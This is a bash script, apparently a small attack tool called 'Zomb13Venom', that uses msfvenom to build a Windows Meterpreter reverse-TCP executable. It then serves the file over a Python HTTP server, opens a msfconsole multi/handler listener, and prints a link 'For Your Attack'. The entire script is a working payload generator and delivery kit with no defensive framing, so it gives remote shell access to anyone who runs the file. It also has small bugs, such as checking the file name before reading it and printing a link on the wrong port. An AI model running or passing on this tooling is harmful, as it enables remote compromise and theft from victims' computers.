#!/bin/bash

### text colours ###

red='\e[0;31m'
green='\e[0;32m'
blue='\e[0;34m'
nc='\e[0m'

cat << "E0F"
__________            ___.   .______________   ____                            
\____    /____   _____\_ |__ |__\_____  \   \ /   /____   ____   ____   _____  
  /     //  _ \ /     \| __ \|  | _(__  <\   Y   // __ \ /    \ /  _ \ /     \ 
 /     /(  <_> )  Y Y  \ \_\ \  |/       \\     /\  ___/|   |  (  <_> )  Y Y  \
/_______ \____/|__|_|  /___  /__/______  / \___/  \___  >___|  /\____/|__|_|  /
        \/           \/    \/          \/             \/     \/             \/ 
  
E0F
echo -e "${red}This Script will create a Reverse TCP Windows payload, Host the file and Start the listener.${nc}" 
echo
echo "Created by @CyberZombi3 Version 1.0"
echo
echo "Hey" $USER
echo "Your Current IP Address is"
hostname -I
echo "Please Enter The IP For Payload"

read -p 'IP Address: ' varip

echo "Please Enter Port Number For Payload"

read -p 'Port Number: ' varport

echo "Please Enter The Payload Name"

if [[ ! $varpayname == *.exe ]]
then
	varpayname=$varpayname".exe"
fi
read -p 'Payload Name: ' varpayname
echo "Creating Payload"; sleep 2
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=$varip lport=$varport -f exe -o /tmp/$varpayname; sleep 6
echo "Payload Created"; sleep 2
#echo "Moving to /tmp"; sleep 2
cd /tmp
echo "Confirming Payload Within /tmp"; sleep 2
ls *.exe; sleep 1
echo "Opening Listener & Starting Simmple HTTP Server"
echo "Please Wait For The MSFCosole To Load"
echo "Use This Link For Your Attack" http://$varip:$varport/$varpayname
mate-terminal --window --command="msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost $varip; set lport $varport; exploit\"" & mate-terminal --window --command="python -m SimpleHTTPServer 8000"
$SHELL


